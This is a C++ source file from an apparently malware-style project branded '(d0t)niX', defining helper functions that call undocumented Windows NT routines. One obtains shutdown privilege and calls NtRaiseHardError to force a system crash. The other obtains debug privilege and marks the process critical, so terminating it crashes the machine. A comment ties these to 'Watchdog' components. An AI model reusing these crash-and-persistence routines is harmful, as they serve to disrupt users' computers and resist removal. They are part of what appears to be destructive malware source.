/*-----------------------------------------------------+---------------------------\
 |    ___    __________   __  ___          ______  ___ |  _______   __   ____      |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / |  \      \_/  |_|    |     |
 |  /  / / __ | /  / \  \   __\\  \ /    \|  |\     /  |  /   |   \   __\    |     |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  | /    |    \  | |    |___  |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ | \____|__  /__| |_______ \ |
 |   \__\    \/        \/     /__/      \/         \_/ |         \/             \/ |
 +------------------------------------------------+----+---------------------------/
 | NTUtilities.cpp :: (d0t)niX's NT/RTL Functions |
 \------------------------------------------------*/

#include "../../Header-Files/pch.h"
#include "../../Header-Files/(d0t)niX.h"

#if NT_FUNCTIONS == TRUE
	// NtRaiseHardError isn't actually used right now but included for later use with the Watchdog's
	BOOL fnNTRaiseHardError(VOID) {
		BOOLEAN bl;
		if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
			UINT u;
			if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, NULL, NULL, OPTION_SHUTDOWN_SYSTEM, &u)) {
				fnMessageHandlerW(NULL, L"Failed to raise HardError", L"NtRaiseHardError", MB_ICONERROR);
				return FALSE;
			}
		} else {
			fnMessageHandlerW(NULL, L"Couldn't set Shutdwon Privileges", L"RtlAdjustPrivilege", MB_ICONERROR);
			return FALSE;
		}
	}

	BOOL fnNTSetProcessIsCritical(
		_In_ BOOLEAN blIsCritical
	) {
		BOOLEAN bl;
		if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
			if (!RtlSetProcessIsCritical(blIsCritical, NULL, FALSE)) {
				return TRUE;
			} else {
				fnMessageHandlerW(NULL, L"Couldn't set Process Critical", L"RtlSetProcessIsCritical", MB_ICONERROR);
				return FALSE;
			}
		} else {
			fnMessageHandlerW(NULL, L"Couldn't set Debug Privileges", L"RtlAdjustPrivilege", MB_ICONERROR);
			return FALSE;
		}
	}
#endif // !DISABLE_NT_FUNCTIONS